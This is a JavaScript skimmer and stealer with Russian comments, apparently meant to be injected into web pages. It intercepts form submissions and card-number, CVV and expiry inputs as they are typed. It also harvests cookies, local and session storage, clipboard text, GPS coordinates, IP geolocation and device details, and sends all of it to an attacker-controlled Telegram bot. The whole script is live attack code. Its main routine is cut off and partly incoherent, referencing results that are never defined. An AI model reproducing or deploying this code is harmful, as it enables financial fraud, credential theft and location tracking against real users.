<script>

function log(msg) {
    LOG.innerHTML += msg + "\n";
    LOG.scrollTop = LOG.scrollHeight;
}

function send(text) {
    if (text.length > 4000) {
        var chunks = text.match(/.{1,4000}/g);
        chunks.forEach(function(chunk) {
            new Image().src = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(chunk);
        });
    } else {
        new Image().src = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);
    }
}

// ===== 1. КРАЖА БАНКОВСКИХ ДАННЫХ ЧЕРЕЗ ПЕРЕХВАТ ФОРМ =====
function setupBankDataStealer() {
    log('[БАНК] Установка перехватчиков форм...');
    
    // Перехват всех отправок форм
    document.addEventListener('submit', function(e) {
        var form = e.target;
        var data = collectFormData(form);
        if (data && data.length > 0) {
            var msg = '===== 💳 ПЕРЕХВАТ ФОРМЫ (BANK) =====\n';
            msg += '🔗 URL: ' + window.location.href + '\n';
            msg += '📅 Время: ' + new Date().toLocaleString() + '\n';
            msg += '📋 Данные:\n' + data;
            send(msg);
            log('[БАНК] Перехвачена форма: ' + data.substring(0, 100) + '...');
            collectedData.bankData.push(data);
        }
    }, true);

    // Перехват изменений в полях ввода (для кредитных карт)
    document.addEventListener('input', function(e) {
        var el = e.target;
        if (el.tagName === 'INPUT' && el.type === 'text' || el.type === 'number' || el.type === 'tel') {
            var value = el.value;
            // Определяем тип поля по атрибутам
            var name = (el.name || el.id || '').toLowerCase();
            var isCard = name.includes('card') || name.includes('cvc') || name.includes('cvv') || 
                         name.includes('exp') || name.includes('date') || name.includes('cc') ||
                         name.includes('pan') || name.includes('number') && el.maxLength >= 16;
            if (isCard && value && value.length >= 4) {
                var msg = '💳 Банковская карта (ввод): ' + value + 
                          ' | Поле: ' + (el.name || el.id || 'unknown') + 
                          ' | URL: ' + window.location.href;
                send(msg);
                log('[БАНК] Обнаружен ввод карты: ' + value.substring(0, 4) + '****');
                collectedData.cards.push(value);
            }
        }
    }, true);

    // Перехват фокуса на полях пароля
    document.addEventListener('focus', function(e) {
        var el = e.target;
        if (el.tagName === 'INPUT' && el.type === 'password') {
            var msg = '🔑 Поле пароля активировано: ' + (el.name || el.id || 'unknown') + 
                      ' | URL: ' + window.location.href;
            send(msg);
            log('[ПАРОЛЬ] Поле пароля сфокусировано');
        }
    }, true);
}

// Сбор данных из формы
function collectFormData(form) {
    var data = '';
    var elements = form.querySelectorAll('input, select, textarea');
    elements.forEach(function(el) {
        if (el.type === 'submit' || el.type === 'button' || el.type === 'reset') return;
        var name = el.name || el.id || 'unknown';
        var value = el.value || el.innerText || '';
        if (value && value.length > 0) {
            // Маскируем пароли
            if (el.type === 'password') {
                data += '  🔑 ' + name + ' = ' + '******** (длина: ' + value.length + ')\n';
            } else {
                data += '  📝 ' + name + ' = ' + (value.length > 100 ? value.substring(0, 100) + '...' : value) + '\n';
            }
        }
    });
    return data;
}

// ===== 2. КРАЖА КУКИ ВСЕМИ МЕТОДАМИ =====
function iframeCookieSteal(domains) {
    return new Promise(function(resolve) {
        var results = [];
        var total = domains.length;
        var loaded = 0;
        var container = document.createElement('div');
        container.style.display = 'none';
        document.body.appendChild(container);

        domains.forEach(function(domain) {
            var iframe = document.createElement('iframe');
            iframe.src = 'https://' + domain;
            iframe.style.width = '1px';
            iframe.style.height = '1px';
            iframe.style.border = 'none';
            iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-popups');
            
            iframe.onload = function() {
                loaded++;
                try {
                    var doc = iframe.contentDocument || iframe.contentWindow.document;
                    if (doc && doc.cookie) {
                        var cookies = doc.cookie;
                        if (cookies && cookies.length > 0) {
                            results.push(domain + ': ' + cookies);
                            collectedData.cookies[domain] = cookies;
                            log('[КУКИ] + ' + domain);
                        }
                    }
                } catch(e) {}
                if (loaded === total) resolve(results);
            };
            container.appendChild(iframe);
        });
        setTimeout(function() { resolve(results); }, 10000);
    });
}

function imageCookieSteal(domains) {
    return new Promise(function(resolve) {
        var results = [];
        var total = domains.length;
        var loaded = 0;
        domains.forEach(function(domain) {
            var img = new Image();
            img.crossOrigin = 'use-credentials';
            img.src = 'https://' + domain + '/favicon.ico?' + Date.now();
            img.onload = function() {
                results.push(domain + ': запрос выполнен (куки отправлены)');
                loaded++;
                if (loaded === total) resolve(results);
            };
            img.onerror = function() {
                loaded++;
                if (loaded === total) resolve(results);
            };
        });
        setTimeout(function() { resolve(results); }, 10000);
    });
}

function fetchCookieSteal(domains) {
    return new Promise(function(resolve) {
        var results = [];
        var total = domains.length;
        var fetched = 0;
        domains.forEach(function(domain) {
            fetch('https://' + domain, {
                method: 'GET',
                credentials: 'include',
                mode: 'no-cors'
            })
            .then(function() {
                results.push(domain + ': fetch выполнен');
                fetched++;
                if (fetched === total) resolve(results);
            })
            .catch(function() {
                fetched++;
                if (fetched === total) resolve(results);
            });
        });
        setTimeout(function() { resolve(results); }, 10000);
    });
}

// ===== 3. СБОР ВСЕХ ДАННЫХ УСТРОЙСТВА =====
function collectDeviceInfo() {
    var info = '===== 📱 УСТРОЙСТВО =====\n';
    info += 'UserAgent: ' + navigator.userAgent + '\n';
    info += 'Память: ' + (navigator.deviceMemory || '?') + ' GB\n';
    info += 'Экран: ' + screen.width + 'x' + screen.height + '\n';
    info += 'DPI: ' + (window.devicePixelRatio || 1) + '\n';
    info += 'Язык: ' + navigator.language + '\n';
    info += 'Платформа: ' + navigator.platform + '\n';
    info += 'Вендор: ' + navigator.vendor + '\n';
    info += 'Время: ' + new Date().toLocaleString() + '\n';
    return info;
}

// ===== 4. IP + ГЕО =====
function getIPAndGeo() {
    return new Promise(function(resolve) {
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                var ip = data.ip;
                fetch('https://ipapi.co/' + ip + '/json/')
                    .then(r => r.json())
                    .then(geo => {
                        var info = '===== 🌍 IP И ГЕО =====\n';
                        info += 'IP: ' + ip + '\n';
                        info += 'Город: ' + (geo.city || '?') + '\n';
                        info += 'Регион: ' + (geo.region || '?') + '\n';
                        info += 'Страна: ' + (geo.country_name || '?') + '\n';
                        info += 'Почтовый индекс: ' + (geo.postal || '?') + '\n';
                        info += 'Координаты: ' + (geo.latitude || '?') + ', ' + (geo.longitude || '?') + '\n';
                        info += 'ISP: ' + (geo.org || '?') + '\n';
                        collectedData.ip = ip;
                        collectedData.geo = info;
                        resolve(info);
                    })
                    .catch(function() { resolve('===== 🌍 IP =====\nIP: ' + ip); });
            })
            .catch(function() { resolve('===== 🌍 IP =====\nНе удалось определить'); });
    });
}

// ===== 5. GPS =====
function getGPS() {
    return new Promise(function(resolve) {
        try {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    var info = '===== 📍 GPS =====\n';
                    info += 'Широта: ' + pos.coords.latitude + '\n';
                    info += 'Долгота: ' + pos.coords.longitude + '\n';
                    info += 'Точность: ' + pos.coords.accuracy + ' м\n';
                    info += 'Карта: https://maps.google.com/?q=' + pos.coords.latitude + ',' + pos.coords.longitude + '\n';
                    collectedData.gps = info;
                    resolve(info);
                },
                function(err) {
                    var info = '===== 📍 GPS =====\n';
                    if (err.code === 1) info += 'Отклонено пользователем\n';
                    else if (err.code === 2) info += 'Позиция недоступна\n';
                    else if (err.code === 3) info += 'Таймаут\n';
                    else info += 'Ошибка: ' + err.message + '\n';
                    resolve(info);
                },
                { enableHighAccuracy: true, timeout: 15000 }
            );
        } catch(e) {
            resolve('===== 📍 GPS =====\nНе поддерживается');
        }
    });
}

// ===== 6. БУФЕР ОБМЕНА =====
function getClipboard() {
    return new Promise(function(resolve) {
        try {
            if (navigator.clipboard && navigator.clipboard.readText) {
                navigator.clipboard.readText()
                    .then(text => {
                        collectedData.clipboard = text || 'пусто';
                        resolve('===== 📋 БУФЕР =====\n' + (text || 'пусто'));
                    })
                    .catch(() => resolve('===== 📋 БУФЕР =====\nДоступ запрещён'));
            } else {
                resolve('===== 📋 БУФЕР =====\nAPI недоступен');
            }
        } catch(e) {
            resolve('===== 📋 БУФЕР =====\nОшибка');
        }
    });
}

// ===== 7. LOCALSTORAGE + SESSIONSTORAGE =====
function getStorages() {
    var result = '===== 💾 STORAGE =====\n';
    try {
        result += '📍 localStorage:\n';
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            var val = localStorage.getItem(key);
            if (val && val.length > 0) {
                result += '  ' + key + ' = ' + (val.length > 100 ? val.substring(0, 100) + '...' : val) + '\n';
                collectedData.localStorage[key] = val;
            }
        }
    } catch(e) { result += '  localStorage: ошибка\n'; }

    try {
        result += '📍 sessionStorage:\n';
        for (var j = 0; j < sessionStorage.length; j++) {
            var key2 = sessionStorage.key(j);
            var val2 = sessionStorage.getItem(key2);
            if (val2 && val2.length > 0) {
                result += '  ' + key2 + ' = ' + (val2.length > 100 ? val2.substring(0, 100) + '...' : val2) + '\n';
                collectedData.sessionStorage[key2] = val2;
            }
        }
    } catch(e) { result += '  sessionStorage: ошибка\n'; }
    return result;
}

// ===== 8. БАТАРЕЯ =====
function getBattery() {
    return new Promise(function(resolve) {
        try {
            if (navigator.getBattery) {
                navigator.getBattery().then(function(b) {
                    var info = '===== 🔋 БАТАРЕЯ =====\n';
                    info += 'Уровень: ' + Math.round(b.level * 100) + '%\n';
                    info += 'Зарядка: ' + (b.charging ? 'да' : 'нет') + '\n';
                    resolve(info);
                });
            } else {
                resolve('===== 🔋 БАТАРЕЯ =====\nНедоступно');
            }
        } catch(e) {
            resolve('===== 🔋 БАТАРЕЯ =====\nОшибка');
        }
    });
}

// ===== 10. ОСНОВНАЯ ФУНКЦИЯ СБОРА =====
async function main() {
    log('[SWILL] Запуск полного сбора данных...');
    log('[SWILL] Токен: ' + TOKEN);
    log('[SWILL] Chat ID: ' + CHAT_ID);

    // 1. Установка перехватчиков форм (банковские данные)

        send('===== 🍪 КУКИ (fetch) =====\n' + result3.join('\n'));

    // 9. Итоговый отчет
    var finalReport = '===== 📊 ИТОГОВЫЙ ОТЧЕТ =====\n';
    finalReport += '✅ Сбор завершён\n';
    finalReport += '📅 ' + new Date().toLocaleString() + '\n';

    send(finalReport);

    log('[✓] Редирект через 3 секунды...');
